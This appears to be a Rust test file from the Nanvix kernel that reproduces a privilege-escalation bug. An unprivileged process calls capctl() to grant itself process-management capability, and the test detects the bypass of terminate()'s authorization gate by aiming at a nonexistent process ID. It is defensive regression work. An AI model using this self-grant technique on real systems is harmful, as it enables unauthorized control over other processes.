// Copyright(c) The Maintainers of Nanvix.
// Licensed under the MIT License.

//! # `capctl()` Privilege-Escalation Reproduction (CR-7)
//!
//! Reproduces the authorization gap at `src/kernel/src/pm/kcall/capctl.rs:32`, where `do_capctl`
//! mutates a process's capabilities without any privilege check (an in-tree `//FIXME` acknowledges
//! the gap). Because of this, an unprivileged process can self-grant
//! [`Capability::ProcessManagement`] and thereby defeat the authorization gate that
//! `terminate()` (and cross-process signal/event control) rely on.
//!
//! The reproduction is non-destructive: it targets a process identifier that does not exist, so no
//! real process is ever terminated. The bug is observed purely from the *error code* returned by
//! the `terminate()` gate:
//!
//! 1. As an unprivileged process, `terminate(non_existent)` is rejected with
//!    [`ErrorCode::PermissionDenied`] — the capability gate fires *before* the target lookup.
//! 2. `capctl(ProcessManagement, true)` returns `Ok(())` — the self-grant with NO privilege check
//!    (the bug).
//! 3. `terminate(non_existent)` now returns [`ErrorCode::NoSuchProcess`] — the capability gate now
//!    PASSES and execution reaches the (failing) target lookup.
//!
//! The gate flipping from `PermissionDenied` to `NoSuchProcess`, with the *only* intervening action
//! being a self-`capctl`, is the privilege escalation. Were `capctl` correctly gated, step 2 would
//! be denied and step 3 would still report `PermissionDenied`.

//==================================================================================================
// Imports
//==================================================================================================

use ::sys::{
    error::ErrorCode,
    pm::{
        Capability,
        ProcessIdentifier,
    },
};

//==================================================================================================
// Constants
//==================================================================================================

/// A process identifier that is guaranteed not to correspond to any live process. Daemons occupy
/// pids 0..=3 and the init process pid 4; a value this large can never be a real pid, so the
/// termination request can only ever fail at the target-lookup stage — never actually kill anything.
const NON_EXISTENT_PID_RAW: i32 = 1_000_000;

//==================================================================================================
// Private Standalone Functions
//==================================================================================================

///
/// # Description
///
/// Demonstrates that an unprivileged process can self-grant
/// [`Capability::ProcessManagement`] through `capctl()` and thereby bypass the authorization gate
/// enforced by `terminate()`.
///
/// # Returns
///
/// Returns `true` when the escalation is observed (i.e. the bug reproduces). Returns `false` if the
/// unprivileged precondition does not hold or the escalation does not occur (which is what a
/// correctly-gated `capctl()` would produce).
///
fn test_capctl_self_grant_escalates_terminate() -> bool {
    let victim: ProcessIdentifier = ProcessIdentifier::from(NON_EXISTENT_PID_RAW);

    // Precondition: as an unprivileged process, the terminate gate must reject us with
    // PermissionDenied *before* it even looks up the target. If we already held the capability the
    // error would be NoSuchProcess, so this also proves we start unprivileged.
    match ::sys::kcall::pm::__kcall_terminate(victim) {
        Err(error) if error.code == ErrorCode::PermissionDenied => {
            ::syslog::info!("baseline: unprivileged terminate() -> PermissionDenied (gate active)");
        },
        other => {
            ::syslog::info!("precondition not met: expected PermissionDenied, got {:?}", other);
            return false;
        },
    }

    // The bug: self-grant ProcessManagement with no privilege check.
    match ::sys::kcall::pm::__kcall_capctl(Capability::ProcessManagement, true) {
        Ok(()) => {
            ::syslog::info!("BUG: capctl(ProcessManagement, true) -> Ok (no privilege check)");
        },
        other => {
            // A correctly-gated capctl() would land here (e.g. PermissionDenied) -> no escalation.
            ::syslog::info!("capctl self-grant refused: {:?} (capctl appears gated)", other);
            return false;
        },
    }

    // Escalation observed: the terminate gate now passes. The request only fails at the target
    // lookup (NoSuchProcess), proving the capability check no longer blocks us. Capture the outcome
    // before releasing the capability so cleanup cannot mask the result.
    let escalated: bool = match ::sys::kcall::pm::__kcall_terminate(victim) {
        Err(error) if error.code == ErrorCode::NoSuchProcess => {
            ::syslog::info!(
                "ESCALATED: terminate() -> NoSuchProcess (gate PASSED after self-grant)"
            );
            true
        },
        Err(error) if error.code == ErrorCode::PermissionDenied => {
            ::syslog::info!("no escalation: terminate() still PermissionDenied");
            false
        },
        other => {
            ::syslog::info!("unexpected terminate() outcome after self-grant: {:?}", other);
            false
        },
    };

    // Cleanup: release the capability so this process is left in its original unprivileged state.
    let _ = ::sys::kcall::pm::__kcall_capctl(Capability::ProcessManagement, false);

    escalated
}

//==================================================================================================
// Public Standalone Functions
//==================================================================================================

///
/// # Description
///
/// Runs the `capctl()` privilege-escalation reproduction for CR-7.
///
pub fn test() {
    crate::test!(test_capctl_self_grant_escalates_terminate());
}
